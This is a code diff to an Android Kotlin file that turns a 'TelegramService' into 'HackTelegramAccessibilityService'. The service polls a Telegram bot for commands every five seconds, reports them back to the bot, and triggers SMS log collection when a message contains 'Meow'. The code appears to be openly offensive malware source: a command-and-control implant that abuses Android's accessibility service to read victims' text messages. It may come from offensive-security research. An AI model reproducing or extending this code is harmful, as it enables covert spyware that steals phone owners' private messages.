@@ -1,104 +1,72 @@
 package cocomelonc.hack.services
 
-import android.app.*
-import android.content.Context
-import android.content.Intent
-import android.os.Build
-import android.os.IBinder
-import androidx.core.app.NotificationCompat
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.launch
-
+import android.accessibilityservice.AccessibilityService
 import android.util.Log
+import android.view.accessibility.AccessibilityEvent
 import cocomelonc.hack.tools.HackNetwork
 import cocomelonc.hack.tools.HackSmsLogs
-import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.*
 
-class TelegramService() : Service() {
+class HackTelegramAccessibilityService : AccessibilityService() {
 
-    private val notificationChannelId = "telegram_listener_channel"
     private var lastUpdateId = 0
+    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
 
-    override fun onCreate() {
-        super.onCreate()
-        Log.d("TelegramService", "service started")
+    companion object {
+        private const val TAG = "HackTelegramAccessibilityService"
+    }
 
-        val context = applicationContext
-        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+    override fun onServiceConnected() {
+        super.onServiceConnected()
+        Log.d(TAG, "accessibility service connected")
 
-        createNotificationChannel()
-        startForeground(1, createNotification())
-        CoroutineScope(Dispatchers.IO).launch {
-            startListeningForMessages()
+        serviceScope.launch {
+            listenToTelegram()
         }
     }
 
-    private fun startListeningForMessages() {
-        // get updates from Telegram
-        try {
-            while (true) {
-                val updatesResponse = HackNetwork(applicationContext).getUpdates(lastUpdateId) // new messages
-                val updates = updatesResponse?.updates()
-
-                if (updates != null) {
-                    for (update in updates) {
-                        // message test
-                        val message = update.message().text()
-                        sendMessageToTelegram("New message received: $message")
-                        Log.d("TelegramService", "New message received: $message")
-                        processCommand(message)
-                        lastUpdateId = update.updateId() + 1
-                    }
-                }
-                // sleep
-                Thread.sleep(5000)  // every 5 sec
-            }
-        } catch (e: Exception) {
-            Log.d("TelegramService", "{$e.message}")
-        }
+    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        // not used
     }
 
-    private fun sendMessageToTelegram(message: String) {
-        HackNetwork(applicationContext).sendTextMessage(message)
-    }
-
-    private fun processCommand(command: String) {
-        // fetch commands
-        if (command.contains("Meow")) {
-            HackSmsLogs(applicationContext).getSmsLogs()
-            Log.d("TelegramService", "{$command}")
-        } else {
-            Log.d("TelegramService", "Unknown command: {$command}")
-        }
-    }
-
-    private fun createNotification(): Notification {
-        return NotificationCompat.Builder(this, notificationChannelId)
-            .setContentTitle("Hack Listener")
-            .setContentText("Listening for new messages")
-            .setSmallIcon(android.R.drawable.ic_dialog_info)
-            .build()
-    }
-
-    private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                notificationChannelId,
-                "Telegram Listener Service",
-                NotificationManager.IMPORTANCE_LOW
-            )
-            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-            notificationManager.createNotificationChannel(channel)
-        }
-    }
-
-    override fun onBind(intent: Intent?): IBinder? {
-        return null
+    override fun onInterrupt() {
+        Log.d(TAG, "accessibility service interrupted")
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        // stop listener
-        Log.d("TelegramService", "Service stopped")
+        serviceScope.cancel()
+    }
+
+    private suspend fun listenToTelegram() {
+        val network = HackNetwork(applicationContext)
+        while (isActive) {
+            try {
+                val updatesResponse = network.getUpdates(lastUpdateId)
+                val updates = updatesResponse?.updates()
+                if (!updates.isNullOrEmpty()) {
+                    for (update in updates) {
+                        val message = update.message()?.text()
+                        message?.let {
+                            Log.d(TAG, "received: $it")
+                            network.sendTextMessage("new command: $it")
+                            processCommand(it)
+                            lastUpdateId = update.updateId() + 1
+                        }
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "error: ${e.message}")
+            }
+            delay(5000)
+        }
+    }
+
+    private fun processCommand(command: String) {
+        if (command.contains("Meow", ignoreCase = true)) {
+            HackSmsLogs(applicationContext).getSmsLogs()
+        } else {
+            HackNetwork(applicationContext).sendTextMessage("Unknown command: $command")
+        }
     }
 }
